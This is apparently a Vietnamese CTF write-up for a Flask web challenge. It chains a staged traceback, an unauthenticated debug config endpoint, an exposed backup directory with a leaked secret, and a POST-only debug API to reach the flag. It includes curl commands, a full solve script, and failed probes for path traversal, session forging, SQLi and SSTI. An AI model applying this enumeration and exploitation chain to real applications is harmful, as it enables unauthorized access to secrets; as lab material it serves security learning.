---
title: "The Debugger"
category: "Web"
tags: ["information-disclosure", "debug-endpoint", "http-method", "flask"]
solve_date: "2026-10-10T21:13:00+07:00"
language: "vi"
points: 346
---

# The Debugger

**Flag:** `foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}`  
**Service:** `http://54.87.116.237:5002` — Flask chạy sau gunicorn, giao diện tự xưng "PixelShare"

## Đề bài

> A startup has deployed a web application that allows users to manage their profiles and upload profile pictures. Everything seems to work perfectly, from login and profile management to the image gallery.
>
> But behind the polished interface, something has gone wrong. The developers may have left behind a debugging feature that was never meant to reach production.
>
> Your mission is to investigate the application, uncover its hidden development features, and follow the trail to retrieve the secret stored on the server.
>


## Phân tích

Fingerprint từ response: `Server: gunicorn`, `Vary: Cookie`, HTML render bằng template Jinja có CSS dùng chung cho mọi trang. Bề mặt đọc được bằng GET:

```text
/            /login  /register  /logout  /profile  /gallery  /health
```

Hai điểm đáng chú ý ngay từ vòng khảo sát:

- `/gallery` chỉ là stub — `"Image upload and gallery browsing are coming soon. Check back later!"`. Không có endpoint nào nhận `multipart/form-data`, mặc dù đề bài mô tả tính năng tải ảnh.
- `/profile` chấp nhận `?id=` và trả hồ sơ của bất kỳ user nào theo id.

Nguồn dữ liệu chính là trang lỗi 500. Với session đã đăng nhập, một giá trị `id` không phải số làm view rơi ở `int()`:

```console
$ curl -s -b "session=<cookie của tài khoản đã đăng nhập>" \
       "http://54.87.116.237:5002/profile?id=abc"
```

```text
File "/app/routes/profile.py", line 41, in profile
    user_id = int(request.args.get("id"))
ValueError: invalid literal for int() with base 10: 'abc'
File "/app/config/settings.py", line 17, in load_config
    # dev-only route, disabled by DEBUG_ROUTES_ENABLED flag in prod
    app.add_url_rule("/__debug__/config", view_func=debug_config)
File "/app/wsgi.py", line 9, in <module>
    from app.config.settings import load_config
...
Error id: 0xDEADC0DE
```

Trang này do bài toán dựng sẵn, không phải traceback đang chạy: độ dài HTML thay đổi đúng theo độ dài chuỗi gửi vào (`abc` → 1872, `0` → 1871, `1'` → 1875) trong khi danh sách frame giữ nguyên, và `int("0")` vốn là phép hợp lệ nên dòng `ValueError` ứng với `id=0` không phải lỗi thật. Ba frame trên vì thế là breadcrumb chủ đích, trong đó frame thứ hai chỉ thẳng tên route debug.

## Lời giải

**Bước 1 — debug config.** Route được lộ ở frame `settings.py` mở được mà không cần đăng nhập:

```console
$ curl -s http://54.87.116.237:5002/__debug__/config
{"backup":"/internal/backup","debug":true,"environment":"development","note":"This endpoint must be disabled before production deploy.","storage":"/var/www/uploads/"}
```

**Bước 2 — thư mục backup.** Khóa `backup` trỏ tới một directory listing thật, sinh từ `os.listdir`:

```console
$ curl -s http://54.87.116.237:5002/internal/backup
Index of /internal/backup
  .env.bak   config.old   notes.txt   users.json
```

**Bước 3 — secret.** `.env.bak` chứa khóa cần tìm (`notes.txt` ghi "TODO: rotate DEBUG_SECRET after the hackathon demo"):

```ini
# accidentally committed development secrets
DEBUG_SECRET=f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c
SMTP_HOST=localhost
```

**Bước 4 — internal debug API.** Đây là bước không tự suy ra từ breadcrumb: `/api/internal/debug` không xuất hiện trong bất kỳ response nào ở ba bước trên, nên cần hint của cuộc thi (120 điểm) chỉ định POST request với secret đặt trong JSON body.

```console
$ curl -s -X POST http://54.87.116.237:5002/api/internal/debug \
       -H "Content-Type: application/json" \
       --data '{"secret":"f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c"}'
{"flag":"foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}","message":"Debug mode authenticated"}
```

Endpoint kiểm tra đúng tên khóa và kiểu nội dung: `{"secret": ...}` cho 200, trong khi `{"DEBUG_SECRET": ...}`, form-encoded, hoặc secret đặt ở header đều 403.

## Các hướng đã kiểm tra

- **Enumeration chỉ-dùng-GET.** 9,677 từ × 3 prefix (`/`, `/__debug__/`, `/internal/`) = 29,031 request, 0 lỗi, chỉ trả về 8 endpoint đã biết. `GET /api/internal/debug` cho `405` với `Allow: OPTIONS, POST`: route chỉ đăng ký cho POST nên vô hình với wordlist chỉ phát GET, và 405 mới là tín hiệu tồn tại route. Cùng bộ lọc đó phân biệt được hai lớp 404 — 207 byte cho route Flask chưa đăng ký, 14 byte cho static handler.
- **Path traversal.** `/internal/backup/%2e%2e/...` cùng các biến thể double-encode, `%c0%ae`, `....//` đều trả 404 14 byte; `%2f` bị `merge_slashes` chuyển thành 308 về đường dẫn relative, nên tên file không bao giờ bắt đầu bằng `/`. Việc đọc file ngoài thư mục backup bị chặn ở tầng ứng dụng.
- **Forge session Flask.** `DEBUG_SECRET` không phải `SECRET_KEY`: 7 cách biến đổi key và 99,839 ứng viên từ wordlist đều nhận `Signature ... does not match`. Payload session của user đã đăng nhập chỉ có `{"user_id":N}`, kể cả user id 1 — không có field quyền hạn nào để giả.
- **Tiêm ở các chỗ khác.** Các probe trên `?id=` không cho thấy SQL injection; 10 payload `OR`/comment tại `/login` đều trả `Invalid credentials.`; username được escape nên không SSTI (các payload probe SSTI mà người chơi khác đăng ký làm username, gồm biến thể Jinja và ERB cho biểu thức `7*7`, render nguyên văn).
- **Mass assignment tại `/register`.** Thêm `role`, `is_admin`, `developer`, `debug`, `staff` không đổi session và không đổi nội dung render.
- **Spoof môi trường.** `X-Forwarded-For`, `X-Real-IP`, `Host`, `X-Forwarded-Host` và 13 header mang cờ debug không làm thay đổi bất kỳ response nào.
- **Dữ liệu user.** `id=1..300` với session hợp lệ, 0 lỗi, toàn bộ bio là mặc định; `id>=700` trả 500, nên những ID đó không trả được bản ghi qua endpoint này trong các probe đã thực hiện.

Ràng buộc rút ra từ các phép thử trên: chuỗi breadcrumb chỉ dẫn tới `DEBUG_SECRET`, còn bước cuối nằm ở một route POST-only mà khảo sát mặc định không thấy.

## Kết quả

```text
foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}
```

Cờ đọc trực tiếp từ response của challenge service tại `POST /api/internal/debug`. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 với `requests`, và service còn truy cập được. Lưu fenced block Python dưới đây thành `solve_the_debugger.py`, chạy `python solve_the_debugger.py`. Script đi hết chuỗi: đọc debug config, lấy danh sách backup, trích `DEBUG_SECRET` từ `.env.bak`, rồi POST tới internal debug API; phần control cho thấy 405 và 403 phân biệt ra sao.

```python
import re
import requests

BASE = "http://54.87.116.237:5002"

# 1. leaked debug config, reachable without authentication
cfg = requests.get(BASE + "/__debug__/config", timeout=20)
print("[*] GET /__debug__/config ->", cfg.status_code)
print("   ", cfg.text)
backup_path = cfg.json()["backup"]

# 2. directory listing exposed by that config
listing = requests.get(BASE + backup_path, timeout=20)
files = re.findall(r'href="%s/([^"]+)"' % re.escape(backup_path), listing.text)
files = [f for f in files if f != "../"]
print("[*] GET %s -> %s, files: %s" % (backup_path, listing.status_code, files))

# 3. DEBUG_SECRET from .env.bak
env = requests.get(BASE + backup_path + "/.env.bak", timeout=20).text
secret = re.search(r"^DEBUG_SECRET=(\S+)$", env, re.M).group(1)
print("[*] DEBUG_SECRET =", secret)

# 4. the POST-only internal debug API returns the flag
r = requests.post(BASE + "/api/internal/debug", json={"secret": secret}, timeout=20)
print("[*] POST /api/internal/debug ->", r.status_code)
print("   ", r.text)

# controls
print("[*] GET on the same path ->", requests.get(BASE + "/api/internal/debug", timeout=20).status_code,
      "| Allow:", requests.get(BASE + "/api/internal/debug", timeout=20).headers.get("Allow"))
print("[*] wrong secret  ->", requests.post(BASE + "/api/internal/debug",
      json={"secret": "0" * 32}, timeout=20).status_code)
print("[*] wrong key name->", requests.post(BASE + "/api/internal/debug",
      json={"DEBUG_SECRET": secret}, timeout=20).status_code)
print("[*] form-encoded  ->", requests.post(BASE + "/api/internal/debug",
      data={"secret": secret}, timeout=20).status_code)
```

```text
[*] GET /__debug__/config -> 200
    {"backup":"/internal/backup","debug":true,"environment":"development","note":"This endpoint must be disabled before production deploy.","storage":"/var/www/uploads/"}

[*] GET /internal/backup -> 200, files: ['.env.bak', 'config.old', 'notes.txt', 'users.json']
[*] DEBUG_SECRET = f3a9c2e7b1d84f6aa9c3e7b2d81f4a6c
[*] POST /api/internal/debug -> 200
    {"flag":"foobarnitd{d3bug_m0d3_sh0uld_n3v3r_sh1p}","message":"Debug mode authenticated"}

[*] GET on the same path -> 405 | Allow: OPTIONS, POST
[*] wrong secret  -> 403
[*] wrong key name-> 403
[*] form-encoded  -> 403
```

Cờ thu được lặp lại ổn định qua nhiều lần chạy và qua hai client độc lập (`requests` và `curl`).
